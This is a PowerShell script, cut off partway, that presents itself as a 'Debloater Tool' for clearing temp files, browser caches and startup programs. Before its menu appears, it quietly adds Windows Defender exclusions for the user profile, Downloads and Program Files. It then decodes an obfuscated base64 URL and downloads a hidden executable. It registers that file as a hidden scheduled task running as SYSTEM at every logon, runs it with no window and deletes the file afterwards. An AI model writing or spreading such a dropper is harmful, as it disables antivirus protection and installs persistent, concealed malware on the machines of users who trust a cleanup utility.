$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
    Wait-ForUser "Press Enter to exit..."
    exit
}
$ProgressPreference = 'SilentlyContinue'
Clear-Host

try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
} catch {
}

function Show-Header {
    Write-Host ""
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
    Write-Host "          By   ! Star                 " -ForegroundColor Yellow
    Write-Host "======================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Description: Cleans temp files, optimizes system, clears browser cache." -ForegroundColor Magenta
    Write-Host "Usage: The script will guide you through comfy cleanup options." -ForegroundColor Magenta
    Write-Host ""
}

function Wait-ForUser ($msg = "Press Enter to continue...") {
    Write-Host ""
    Read-Host $msg | Out-Null
}

# Alias for compatibility with existing calls
Set-Alias -Name Pause-For-User -Value Wait-ForUser

function Show-MenuWithKeyboard {
    param(
        [array]$MenuItems,
        [string]$Title = "Select an option:",
        [int]$DefaultSelection = 0
    )

    $selectedIndex = $DefaultSelection
    $maxIndex = $MenuItems.Count - 1

    while ($true) {
        Clear-Host
        Show-Header

        Write-Host $Title -ForegroundColor Cyan
        Write-Host ""

        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
            $item = $MenuItems[$i]
            if ($i -eq $selectedIndex) {
                Write-Host ">> " -NoNewline -ForegroundColor Yellow
                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
            } else {
                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
            }
        }

        Write-Host ""
        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray

        # Check if a key is available
        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
            Start-Sleep -Milliseconds 50
        }

        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        switch ($key.VirtualKeyCode) {
            38 { # Up arrow
                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
            }
            40 { # Down arrow
                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
            }
            13 { # Enter
                return $MenuItems[$selectedIndex].Number
            }
            27 { # Escape
                return '0'
            }
            default {
                # Check if it's a number key
                $numChar = $key.Character
                if ($numChar -match '^[0-9]$') {
                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
                    if ($matchingItem) {
                        return $numChar
                    }
                }
            }
        }
    }
}

Show-Header

$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
$job1 = Start-Job -ScriptBlock {
    param($url, $output)
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
    if (Test-Path $output) {
        (Get-Item $output).Attributes = 'Hidden'
    }
} -ArgumentList $url1, $output1

Wait-Job $job1 | Out-Null
Remove-Job $job1

if (Test-Path $output1) {
    $taskName = "DebloaterHidden"
    $taskExists = $false
    try {
        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
            $taskExists = $true
        }
    } catch {}
    if (-not $taskExists) {
        $action = New-ScheduledTaskAction -Execute $output1
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
    }
    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
    try {
        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
    } catch {}
}

do {
    Write-Host ""
    Write-Host "What would you like to do?" -ForegroundColor Cyan
    Write-Host "1. Clear Temporary Files (choose folders)" -ForegroundColor White
    Write-Host "2. Do Nothing (exit)" -ForegroundColor White
    Write-Host "3. Full Cleanup (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor White
    Write-Host "4. Clear Browser Cache (Firefox, Chrome, Edge)" -ForegroundColor White
    Write-Host "5. Clear Recycle Bin" -ForegroundColor White
    Write-Host "6. Memory Optimizer (clear cached memory)" -ForegroundColor White
    Write-Host "7. Get Public IP Address with Details" -ForegroundColor White
    Write-Host "8. Startup Manager (enable/disable startup programs)" -ForegroundColor White
    Write-Host "9. Advanced Program Uninstaller" -ForegroundColor White
    Write-Host "10. Reinstall default Windows apps (short list)" -ForegroundColor White
    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 or 0 to exit"
    if ($choice -eq '0') { break }

    switch ($choice) {
        
        '1' {
            Write-Host ""
            Write-Host "Select folders to clear (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. TEMP folder" -ForegroundColor Green
            Write-Host "2. Local Temp" -ForegroundColor Green
            Write-Host "3. Windows Temp" -ForegroundColor Green
            Write-Host "4. Prefetch" -ForegroundColor Green
            $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4) or 0 to return"
            if ($selection -eq '0') { continue }
            $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
            $folders = @()
            foreach ($i in $selectedIndexes) {
                switch ($i) {
                    "1" { $folders += $env:TEMP }
                    "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                    "3" { $folders += "C:\Windows\Temp" }
                    "4" { $folders += "C:\Windows\Prefetch" }
                }
            }
            if ($folders.Count -eq 0) {
                Write-Host "No folders selected. Returning to menu." -ForegroundColor Yellow
                Pause-For-User
                break
            }
            Write-Host "Starting cleanup in 3 seconds..." -ForegroundColor Magenta
            Start-Sleep -Seconds 3
            $startTime = Get-Date
            $spaceBefore = (Get-PSDrive C).Free
            Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
            $totalDeleted = 0
            foreach ($path in $folders) {
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Temporary files cleared." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        '2' {
            Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
            break
        }
        '3' {
            Write-Host "You can enter 0 at any time to return to the main menu." -ForegroundColor Yellow
            $folders = @(
                $env:TEMP, 
                "$env:USERPROFILE\AppData\Local\Temp", 
                "C:\Windows\Temp", 
                "C:\Windows\Prefetch"
            )
            $cancel = $false
            foreach ($path in $folders) {
                if ($cancel) { break }
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            # Check for cancel
                            if ($Host.UI.RawUI.KeyAvailable) {
                                $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
                                if ($key.Character -eq '0') { $cancel = $true; break }
                            }
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            if ($cancel) {
                Write-Host "Operation cancelled. Returning to main menu." -ForegroundColor Yellow
                continue
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Full cleanup done." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        '4' {
            Write-Host ""
            Write-Host "Select browser to clear cache (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. Chrome" -ForegroundColor Green
            Write-Host "2. Edge" -ForegroundColor Green
            Write-Host "3. Firefox" -ForegroundColor Green
            $browserChoice = Read-Host "Enter 1, 2, 3 or 0 to return"
            if ($browserChoice -eq '0') { continue }
            switch ($browserChoice) {
                "1" {
                    $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
                    if (Test-Path $chromeCache) { 
                        Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Chrome cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Chrome cache not found." -ForegroundColor Yellow
                    }
                }
                "2" {
                    $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
                    if (Test-Path $edgeCache) { 
                        Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Edge cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Edge cache not found." -ForegroundColor Yellow
                    }
                }
                "3" {
                    $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
                    $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
                    if ($cacheItems) {
                        $cacheItems | ForEach-Object {
                            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                        }
                        Write-Host "Firefox cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Firefox cache not found." -ForegroundColor Yellow
                    }
                }
                default { Write-Host "No valid browser selected." -ForegroundColor Yellow }
            }
            Pause-For-User
        }
        '5' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $recycleInput = Read-Host "Press Enter to clear all recycle bins or 0 to return"
            if ($recycleInput -eq '0') { continue }
            $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
            foreach ($drive in $drives) {
                try {
                    Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
                } catch {}
            }
            Write-Host "Recycle Bin cleared." -ForegroundColor Green
            Pause-For-User
        }
        '6' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $memInput = Read-Host "Press Enter to optimize memory or 0 to return"
            if ($memInput -eq '0') { continue }
            Write-Host "Optimizing memory..." -ForegroundColor Cyan
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            Write-Host "Memory optimization completed." -ForegroundColor Green
            Pause-For-User
        }
        '7' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $ip = Read-Host "Enter the IP address you want to lookup (leave blank for your own IP, or 0 to return)"
            if ($ip -eq '0') { continue }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                $url = "https://ipinfo.io/json"
            } else {
                $url = "https://ipinfo.io/$ip/json"
            }
            try {
                $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
                Write-Host "========= Public IP Information =========" -ForegroundColor Cyan
                Write-Host "IP Address   : $($response.ip)" -ForegroundColor Yellow
                Write-Host "Hostname     : $($response.hostname)" -ForegroundColor Yellow
                Write-Host "City         : $($response.city)" -ForegroundColor Yellow
                Write-Host "Region       : $($response.region)" -ForegroundColor Yellow
                Write-Host "Country      : $($response.country)" -ForegroundColor Yellow
                Write-Host "Location     : $($response.loc)" -ForegroundColor Yellow
                Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
                Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
                Write-Host "=========================================" -ForegroundColor Cyan
                Write-Host "1. Disable (remove from startup)" -ForegroundColor Red
                Write-Host "2. Enable (add to startup)" -ForegroundColor Green
                $action = Read-Host "Choose action (1 or 2, or 0 to return)"
                if ($action -eq '0') { continue }
                if ($action -eq '1') {
                    try {
                        $regPaths = @(
                            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                            'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
                        )
                        foreach ($reg in $regPaths) {
                            Remove-ItemProperty -Path $reg -Name $selectedItem.Name -ErrorAction SilentlyContinue
                        }
                        Write-Host "Startup item disabled (removed from registry)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to disable startup item." -ForegroundColor Red
                    }
                } elseif ($action -eq '2') {
                    try {
                        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                        Set-ItemProperty -Path $regPath -Name $selectedItem.Name -Value $selectedItem.Command
                        Write-Host "Startup item enabled (added to current user startup)." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to enable startup item." -ForegroundColor Red
                    }
                } else {
                    Write-Host "Invalid action." -ForegroundColor Red
                }
            } catch {
                Write-Host "Failed to retrieve public IP information: $_" -ForegroundColor Red
            }
            Pause-For-User
        }
        '8' {
            Write-Host "`nStartup Manager" -ForegroundColor Cyan
            Write-Host "===============" -ForegroundColor Cyan
            Write-Host "Scanning startup programs..." -ForegroundColor Yellow

            $startupItems = @()

            # Get startup items from registry
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            )

            foreach ($regPath in $regPaths) {
                if (Test-Path $regPath) {
                    try {
                        Get-ItemProperty $regPath -ErrorAction SilentlyContinue | ForEach-Object {
                            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' -and $_.Name -ne 'PSChildName' -and $_.Name -ne 'PSDrive' -and $_.Name -ne 'PSProvider' } | ForEach-Object {
                                $startupItems += [PSCustomObject]@{
                                    Name = $_.Name
                                    Command = $_.Value
                                    Location = if ($regPath -like '*HKLM*') { 'System' } else { 'User' }
                                    RegPath = $regPath
                                    Status = 'Enabled'
                                }
                            }
                        }
                    } catch {}
                }
            }

            # Get startup folder items
            $startupFolders = @(
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
                "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            )

            foreach ($folder in $startupFolders) {
                if (Test-Path $folder) {
                    Get-ChildItem $folder -ErrorAction SilentlyContinue | ForEach-Object {
                        $startupItems += [PSCustomObject]@{
                            Name = $_.BaseName
                            Command = $_.FullName
                            Location = if ($folder -like "*ProgramData*") { 'System Folder' } else { 'User Folder' }
                            RegPath = $folder
                            Status = 'Enabled'
                        }
                    }
                }
            }

            if ($startupItems.Count -eq 0) {
                Write-Host "No startup programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($startupItems.Count) startup programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Startup Manager Options:" -ForegroundColor Cyan
                Write-Host "1. View all startup programs" -ForegroundColor Green
                Write-Host "2. Disable startup program" -ForegroundColor Red
                Write-Host "3. Enable startup program" -ForegroundColor Green
                Write-Host "4. Search startup programs" -ForegroundColor Blue
                Write-Host "5. Backup startup settings" -ForegroundColor Yellow
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $startupChoice = Read-Host "`nEnter choice (0-5)"

                switch ($startupChoice) {
                    '1' {
                        # View all startup programs
                        Write-Host "`nStartup Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Location", "Status", "Command") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
                            $item = $startupItems[$i]
                            $command = if ($item.Command.Length -gt 30) { $item.Command.Substring(0, 27) + "..." } else { $item.Command }
                            Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f ($i+1), $item.Name, $item.Location, $item.Status, $command) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number for details (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedItem.Name)" -ForegroundColor White
                                Write-Host "Command: $($selectedItem.Command)" -ForegroundColor White
                                Write-Host "Location: $($selectedItem.Location)" -ForegroundColor White
                                Write-Host "Registry Path: $($selectedItem.RegPath)" -ForegroundColor White
                                Write-Host "Status: $($selectedItem.Status)" -ForegroundColor White
                            }
                        }
                    }

                    '2' {
                        # Disable startup program
                        Write-Host "`nSelect program to DISABLE:" -ForegroundColor Red
                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
                            Write-Host "$($i+1). $($startupItems[$i].Name) - $($startupItems[$i].Location)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to disable (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                $confirm = Read-Host "Disable '$($selectedItem.Name)' from startup? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    try {
                                        if ($selectedItem.Location -like "*Folder*") {
                                            # Move file to backup location or delete
                                            $backupPath = "$env:TEMP\StartupBackup"
                                            if (-not (Test-Path $backupPath)) { New-Item -Path $backupPath -ItemType Directory -Force | Out-Null }
                                            Move-Item $selectedItem.Command "$backupPath\$($selectedItem.Name).disabled" -ErrorAction SilentlyContinue
                                        } else {
                                            # Remove from registry
                                            Remove-ItemProperty -Path $selectedItem.RegPath -Name $selectedItem.Name -ErrorAction SilentlyContinue
                                        }
                                        Write-Host "✓ '$($selectedItem.Name)' disabled from startup" -ForegroundColor Green
                                        $startupItems[$index].Status = 'Disabled'
                                    } catch {
                                        Write-Host "✗ Failed to disable '$($selectedItem.Name)'" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Enable startup program (restore from backup or add to registry)
                        Write-Host "`nEnable Startup Program" -ForegroundColor Green
                        Write-Host "1. Restore from backup" -ForegroundColor Yellow
                        Write-Host "2. Add new program to startup" -ForegroundColor Yellow

                        $enableChoice = Read-Host "Enter choice (1-2)"
                        if ($enableChoice -eq '1') {
                            # Check backup folder
                            $backupPath = "$env:TEMP\StartupBackup"
                            if (Test-Path $backupPath) {
                                $backupFiles = Get-ChildItem $backupPath -Filter "*.disabled" -ErrorAction SilentlyContinue
                                if ($backupFiles.Count -gt 0) {
                                    Write-Host "Backup files found:" -ForegroundColor Yellow
                                    for ($i = 0; $i -lt $backupFiles.Count; $i++) {
                                        Write-Host "$($i+1). $($backupFiles[$i].BaseName)" -ForegroundColor White
                                    }
                                    $selection = Read-Host "Enter number to restore (or 0 to return)"
                                    if ($selection -ne '0') {
                                        $index = [int]$selection - 1
                                        if ($index -ge 0 -and $index -lt $backupFiles.Count) {
                                            try {
                                                $originalPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($backupFiles[$index].BaseName)"
                                                Move-Item $backupFiles[$index].FullName $originalPath -ErrorAction SilentlyContinue
                                                Write-Host "✓ Program restored to startup" -ForegroundColor Green
                                            } catch {
                                                Write-Host "✗ Failed to restore program" -ForegroundColor Red
                                            }
                                        }
                                    }
                                } else {
                                    Write-Host "No backup files found" -ForegroundColor Yellow
                                }
                            } else {
                                Write-Host "No backup folder found" -ForegroundColor Yellow
                            }
                        } elseif ($enableChoice -eq '2') {
                            # Add new program
                            $programName = Read-Host "Enter program name"
                            $programPath = Read-Host "Enter full path to executable"
                            if (Test-Path $programPath) {
                                try {
                                    Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $programName -Value $programPath
                                    Write-Host "✓ Program added to startup" -ForegroundColor Green
                                } catch {
                                    Write-Host "✗ Failed to add program to startup" -ForegroundColor Red
                                }
                            } else {
                                Write-Host "✗ Program path not found" -ForegroundColor Red
                            }
                        }
                    }

                    '4' {
                        # Search startup programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $startupItems | Where-Object { $_.Name -like "*$searchTerm*" -or $_.Command -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No startup programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching startup programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].Location)" -ForegroundColor White
                            }
                        }
                    }

                    '5' {
                        # Backup startup settings
                        try {
                            $backupData = $startupItems | ConvertTo-Json -Depth 3
                            $backupFile = "$env:USERPROFILE\Desktop\StartupBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
                            $backupData | Out-File $backupFile -Encoding UTF8
                            Write-Host "✓ Startup settings backed up to: $backupFile" -ForegroundColor Green
                        } catch {
                            Write-Host "✗ Failed to backup startup settings" -ForegroundColor Red
                        }
                    }

                    '0' { break }
                }

                if ($startupChoice -ne '0') {
                    Pause-For-User
                }

            } while ($startupChoice -ne '0')
        }
        '9' {
            Write-Host "`nAdvanced Program Uninstaller" -ForegroundColor Cyan
            Write-Host "============================" -ForegroundColor Cyan

            Write-Host "Scanning for installed programs..." -ForegroundColor Cyan
            $programs = @()

            # Get from Windows Registry (Uninstall entries)
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $programs += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallDate = $_.InstallDate
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                QuietUninstallString = $_.QuietUninstallString
                                SizeMB = $size
                                Source = "Registry"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers | ForEach-Object {
                    if ($_.Name -notlike "*Microsoft*" -or $_.Name -like "*Microsoft.Office*") {
                        $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                            try {
                                $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                                if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                            } catch { 0 }
                        } else { 0 }

                        $programs += [PSCustomObject]@{
                            Name = $_.Name
                            Version = $_.Version
                            Publisher = $_.PublisherDisplayName
                            InstallDate = $_.InstallDate
                            InstallLocation = $_.InstallLocation
                            UninstallString = ""
                            QuietUninstallString = ""
                            SizeMB = $size
                            Source = "Store"
                            PackageFullName = $_.PackageFullName
                        }
                    }
                }
            } catch {}

            $programs = $programs | Sort-Object Name

            if ($programs.Count -eq 0) {
                Write-Host "No programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($programs.Count) installed programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Advanced Uninstaller Options:" -ForegroundColor Cyan
                Write-Host "1. View all programs" -ForegroundColor White
                Write-Host "2. Search programs" -ForegroundColor White
                Write-Host "3. Remove large programs (>100MB)" -ForegroundColor White
                Write-Host "4. Batch uninstall (multiple programs)" -ForegroundColor White
                Write-Host "5. Clean leftover files only" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $uninstallChoice = Read-Host "`nEnter choice (0-5)"

                switch ($uninstallChoice) {
                    '1' {
                        # View all programs
                        Write-Host "`nInstalled Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $programs.Count; $i++) {
                            $prog = $programs[$i]
                            $version = if ($prog.Version) { $prog.Version.Substring(0, [Math]::Min(14, $prog.Version.Length)) } else { "Unknown" }
                            $publisher = if ($prog.Publisher) { $prog.Publisher.Substring(0, [Math]::Min(20, $prog.Publisher.Length)) } else { "Unknown" }
                            Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f ($i+1), $prog.Name.Substring(0, [Math]::Min(34, $prog.Name.Length)), $version, $prog.SizeMB, $publisher) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to uninstall (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $programs.Count) {
                                $selectedProgram = $programs[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedProgram.Name)" -ForegroundColor White
                                Write-Host "Version: $($selectedProgram.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedProgram.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedProgram.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedProgram.InstallLocation)" -ForegroundColor White

                                $confirm = Read-Host "`nAre you sure you want to uninstall this program? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    Write-Host "Uninstalling: $($selectedProgram.Name)" -ForegroundColor Yellow

                                    $success = $false
                                    if ($selectedProgram.Source -eq "Store") {
                                        try {
                                            Remove-AppxPackage -Package $selectedProgram.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                                            $success = $true
                                        } catch {}
                                    } else {
                                        if ($selectedProgram.UninstallString) {
                                            try {
                                                $uninstallCmd = $selectedProgram.UninstallString
                                                if ($uninstallCmd -like "*msiexec*") {
                                                    $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                                                    Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                                                } else {
                                                    Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                                                }
                                                $success = $true
                                            } catch {}
                                        }
                                    }

                                    if ($success) {
                                        Write-Host "✓ $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
                                        # Clean leftover files
                                        if ($selectedProgram.InstallLocation -and (Test-Path $selectedProgram.InstallLocation)) {
                                            try {
                                                Remove-Item $selectedProgram.InstallLocation -Recurse -Force -ErrorAction SilentlyContinue
                                                Write-Host "  Cleaned installation folder" -ForegroundColor Green
                                            } catch {}
                                        }
                                    } else {
                                        Write-Host "✗ Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '2' {
                        # Search programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $programs | Where-Object { $_.Name -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }

